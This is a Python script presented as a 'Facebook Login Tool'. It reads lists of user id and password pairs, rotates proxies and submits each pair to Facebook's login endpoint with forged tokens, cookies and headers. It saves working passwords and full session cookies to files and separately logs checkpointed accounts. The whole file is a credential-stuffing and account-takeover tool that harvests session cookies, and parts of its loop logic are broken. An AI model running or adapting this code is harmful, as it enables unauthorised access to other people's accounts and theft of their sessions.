import os, time, random, re, sys, requests

oks, cps, bkas = [], [], []
loop = 0

try:
    xvx = open('/sdcard/proxy.txt', 'r').read().splitlines()
except:
    xvx = ["http://127.0.0.1:8080"]

# Support functions as inline lambdas or direct usage
logo_text = "🔐 Facebook Login Tool (One ID at a time) 🔐"
linex = lambda: print('-' * 50)
check_lock = lambda cid: "live"  # or "locked"

os.system('clear')
print(logo_text)

dfile = input('\n📄 ENTER FILE PATH (e.g., sdcard/mahadi.txt): ')
try:
    dx = open(dfile, 'r').read().splitlines()
except FileNotFoundError:
    print('❌ FILE NOT FOUND...')
    time.sleep(1)
    sys.exit()

if not dx:
    print('❌ FILE IS EMPTY...')
    time.sleep(1)
    sys.exit()

for user in dx:
    os.system('clear')
    print(logo_text)
    print("📲 TOTAL ID : 1")
    print("🔄 PROCESSING ONE ID...")
    linex()

    try:
        ids, pw = user.split('|')
        ids = ids.strip()
        pw = pw.strip()
    except:
        continue

    sys.stdout.write(f"\r ⏳ (M5) ({loop}) (OK-{len(oks)}) (CP-{len(cps)})\r")
    sys.stdout.flush()

    try:
        nip = random.choice(xvx)
        proxs = {'http': nip}
        Session = requests.Session()
        free_fb = Session.get('https://m.facebook.com').text
        data = {
            'jazoest': re.search('name="jazoest" value="(.*?)"', free_fb).group(1),
            'lsd': re.search('name="lsd" value="(.*?)"', free_fb).group(1),
            'email': ids,
            'timezone': '-330',
            'lgndim': 'eyJ3IjoxNDQwLCJoIjo5MDAsImF3IjoxNDQwLCJhaCI6ODYwLCJjIjoyNH0=',
            'lgnrnd': '060331_lb2E',
            'lgnjs': '1751375011',
            'ab_test_data': '/AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAP/ffPPfPAABFAI',
            'locale': 'hi_IN',
            'next': 'https://www.facebook.com/settings/applications/app_details/?app_id=293471457383333',
            'guid': 'f13465d1007fbcb28',
            'prefill_contact_point': '',
            'prefill_source': 'browser_dropdown',
            'prefill_type': 'password',
            'encpass': f"#PWD_BROWSER:0:{str(time.time()).split('.')[0]}:{pw}"
        }

        cookies = {
            'datr': 'kqFRaB1m-_9lS30TJrCcYC28',
            'sb': 'kqFRaADAhKyR-m_DobFeaU6C',
            'ps_l': '1',
            'ps_n': '1',
            'locale': 'hi_IN',
            'fr': '0ugbVyuFAdiFSXbdX..BoUaGS..AAA.0.0.BoY9wG.AWcLS89ZvTPUI126sFbmRUmbVYc',
            'wd': '885x751',
        }

        headers = {
            'authority': 'www.facebook.com',
            'accept': '*/*',
            'accept-language': 'en-US,en;q=0.9',
            'content-type': 'application/x-www-form-urlencoded',
            'origin': 'https://www.facebook.com',
            'referer': 'https://www.facebook.com/settings/applications/app_details/?app_id=293471457383333',
            'sec-fetch-mode': 'navigate',
            'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) Chrome/118.0.0.0 Safari/537.36',
        }

        url = 'https://www.facebook.com/logon/device-based/regular/logon/?logon_attempt=1&lwv=110'
        po = Session.post(url, data=data, cookies=cookies, headers=headers, allow_redirects=False).text
        response = Session.cookies.get_dict().keys()

        if "c_user" in response:
            cok = Session.cookies.get_dict()
            cid = cok["c_user"]
            coki = ";".join([f"{k}={v}" for k, v in cok.items()])
            check = check_lock(cid)
            if "live" in check:
                if '%3A-1%3A-1' in coki:
                    print(f"\n✅ NV-LOGIN: {cid}|{pw}")
                    open("/sdcard/SUMON-NV-COOKIE.txt", "a").write(f"{cid}|{pw}|{coki}\n")
                else:
                    bkas.append(cid)
                    print(f"\n✅ OK: {cid}|{pw}")
                    print(f"🍪 Cookie: {coki}")
                    open("/sdcard/ATOM-COOKIE-OK.txt", "a").write(f"{cid}|{pw}|{coki}\n")
                    oks.append(cid)
            break

        elif 'checkpoint' in response:
            uid = Session.cookies.get_dict()["checkpoint"].split("%")[4].replace("3A", "")
            open('/sdcard/ATOM-CP.txt', 'a').write(f'{uid} | {pw}\n')
            cps.append(uid)
            break

        else:
            continue

        loop += 1

    except Exception as error:
        time.sleep(5)
        pass

    linex()
    print("🔚 PROCESS COMPLETE.")
    linex()
    input("➡️ PRESS ENTER TO LOGIN NEXT ID...")
